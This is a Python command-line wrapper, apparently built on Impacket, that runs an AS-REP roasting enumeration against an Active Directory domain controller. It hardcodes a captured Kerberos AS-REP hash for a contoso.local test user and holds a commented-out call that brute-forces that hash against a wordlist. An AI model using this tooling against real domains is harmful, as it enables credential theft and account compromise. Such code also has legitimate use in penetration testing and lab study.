import cmd
import argparse
import re
from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
from pympacket.utils.bruteforce import bruteforce_asrep, Target

def ipv4_address(value):
    # Regular expression to match an IPv4 address (four octets)
    pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if not re.match(pattern, value):
        raise argparse.ArgumentTypeError(f"Invalid IPv4 address: {value}")
    return value

class ImpacketCLI(cmd.Cmd):
    # Your CLI commands and functionality will go here
    prompt = '>> '
    intro = 'Welcome to Pympacket. Type "help" for available commands.'  # Your intro message
    
    def do_enum(self, args):
        """Get users with no pre-authentication"""
        parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-dcip', '--dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')

        group = parser.add_argument_group()

        group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
        group.add_argument('-p', '--password', type=str, required=False, help='The password to test.')
        group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing the users to test.')
        group.add_argument('-v', '--verbose', type=bool, required=False, help='Whether to print the process or not.')

        try:
            args = parser.parse_args(args.split())
            if not (args.username and args.password) and not args.wordlist:
                parser.error("Username and password or a wordlist are required.")
        except SystemExit:
            print("Invalid arguments. Use 'help get_users' for usage details.")
            parser.print_help()

        cmdLineOptions = {"no_pass": True if args.wordlist else False, "usersfile": args.wordlist, "k": False, 'verbose': args.verbose}

        npu = GetUserNoPreAuth(username=args.username, password=args.password, domain=args.domain, cmdLineOptions=cmdLineOptions)

        target_user = Target(username='l.douglas', domain='contoso.local', hash='$krb5asrep$23$l.douglas@CONTOSO.LOCAL:3b2b825dcf3910791f9e6c6c6452978b$e74721709d2f4d2b29574c066791fca58cd026aacc20fadf6158d160a4a82d637fe8dd344d02dede890ea21442e61c321dce943ed7b58e1c2f41ebacbe5d0295958eadf4607d4e2527428f2b26f48d6457f2c451fc59ad3b365921699b6449f9aa985cc6e1c2c89cc720915892136c9a8851310077d44c3783f393671dc8fda1b5c05c9b1acfb8211f8d42545c5d32d6269ffe8f5c139ae24cf71207c5184f860ca0487181f5d124d7fa5d5ecf81f38eb24783249d46e137aa5acef6a45ebd63d8ecfdd8b0173a46fff5d0382ccab4456b32a7d8c6e3dfc505f529162c8f8b63494ab6a54e5e5a203f36a3621bbb')

        # print(bruteforce_asrep(wordlist='fasttrack.txt', hash=target_user.hash))

        print(npu.run())

    def do_quit(self, line):
        """Exit the CLI."""
        return True
    pass